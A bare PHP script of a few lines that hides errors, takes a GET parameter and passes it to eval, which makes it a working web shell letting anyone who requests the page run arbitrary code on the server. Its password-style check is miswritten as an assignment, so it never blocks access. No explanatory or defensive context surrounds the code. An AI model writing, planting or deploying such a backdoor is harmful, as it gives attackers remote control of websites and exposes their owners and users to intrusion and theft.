<?php
error_reporting(0); 
$u=$_GET['u'];
$i=$_GET['i'];
if ($u=!"a"){
	die('die....');
}
@eval("echo $i");
?>
